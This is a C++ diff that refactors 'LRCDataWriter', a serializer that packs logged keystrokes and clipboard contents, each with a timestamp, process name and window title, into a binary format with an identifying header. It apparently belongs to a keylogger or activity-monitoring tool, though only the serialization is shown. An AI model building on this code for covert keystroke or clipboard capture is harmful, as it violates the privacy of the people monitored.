@@ -5,6 +5,8 @@
 
 namespace LRCData
 {
+	using namespace binbuff;
+
 	template<typename T>
 	ByteVector getBytes(T data)
 	{
@@ -54,33 +56,33 @@ namespace LRCData
 
 	ByteVector LRCDataWriter::GetBytes(std::vector<Keyboard> data)
 	{
-		binpp::BinaryWriter writer;
+		BinaryBuffer buffer;
 
 		// data.count
-		writer.Append<uint32_t>(data.size());
+		buffer.WriteBE<uint32_t>(data.size());
 
 		// data.items[n]
 		for each (Keyboard kbd in data)
 		{
 			// data.items[n].wndInfo
-			writer.Append<uint32_t>(kbd.wndInfo.time);
-			writer.AppendBytes(getStrBytes(kbd.wndInfo.process));
-			writer.AppendBytes(getStrBytes(kbd.wndInfo.title));
+			buffer.WriteBE<uint32_t>(kbd.wndInfo.time);
+			buffer.WriteBE(getStrBytes(kbd.wndInfo.process));
+			buffer.WriteBE(getStrBytes(kbd.wndInfo.title));
 
 			// data.items[n].count
-			writer.Append<uint32_t>(kbd.keys.size());
+			buffer.WriteBE<uint32_t>(kbd.keys.size());
 
 			// data.items[n].keys[n]
 			for each (VKInfo vkInfo in kbd.keys)
 			{
 				// data.items[n].keys[n]
-				writer.Append<uint32_t>(vkInfo.keyCode);
-				writer.Append<uint16_t>(vkInfo.lang);
-				writer.Append<uint8_t>(vkInfo.flags);
+				buffer.WriteBE<uint32_t>(vkInfo.keyCode);
+				buffer.WriteBE<uint16_t>(vkInfo.lang);
+				buffer.WriteBE<uint8_t>(vkInfo.flags);
 			}
 		}
 
-		ByteVector bvData = writer.GetData();
+		ByteVector bvData = buffer.GetBytes();
 
 		header.type = Type::keyboard;
 		header.length = bvData.size();
@@ -94,24 +96,24 @@ namespace LRCData
 
 	ByteVector LRCDataWriter::GetBytes(std::vector<Clipboard> data)
 	{
-		binpp::BinaryWriter writer;
+		BinaryBuffer buffer;
 
 		// data.count
-		writer.Append<uint32_t>(data.size());
+		buffer.WriteBE<uint32_t>(data.size());
 
 		// data.items[n]
 		for each (Clipboard cbd in data)
 		{
 			// data.items[n].wndInfo
-			writer.Append<uint32_t>(cbd.wndInfo.time);
-			writer.AppendBytes(getStrBytes(cbd.wndInfo.process));
-			writer.AppendBytes(getStrBytes(cbd.wndInfo.title));
+			buffer.WriteBE<uint32_t>(cbd.wndInfo.time);
+			buffer.WriteBE(getStrBytes(cbd.wndInfo.process));
+			buffer.WriteBE(getStrBytes(cbd.wndInfo.title));
 
 			// data.items[n].data
-			writer.AppendBytes(getStrBytes(cbd.data));
+			buffer.WriteBE(getStrBytes(cbd.data));
 		}
 
-		ByteVector bvData = writer.GetData();
+		ByteVector bvData = buffer.GetBytes();
 
 		header.type = Type::clipboard;
 		header.length = bvData.size();
@@ -125,13 +127,13 @@ namespace LRCData
 
 	ByteVector LRCDataWriter::getHeaderBytes()
 	{
-		binpp::BinaryWriter writer;
-		writer.Append(header.signature);
-		writer.Append(header.version);
-		writer.Append(header.id, 64);
-		writer.Append(header.type);
-		writer.Append(header.length);
-		return writer.GetData();
+		BinaryBuffer buffer;
+		buffer.WriteBE(header.signature);
+		buffer.WriteBE(header.version);
+		buffer.WriteBE(header.id, 64);
+		buffer.WriteBE(header.type);
+		buffer.WriteBE(header.length);
+		return buffer.GetBytes();
 	}
 
 	void LRCDataWriter::initHeader()
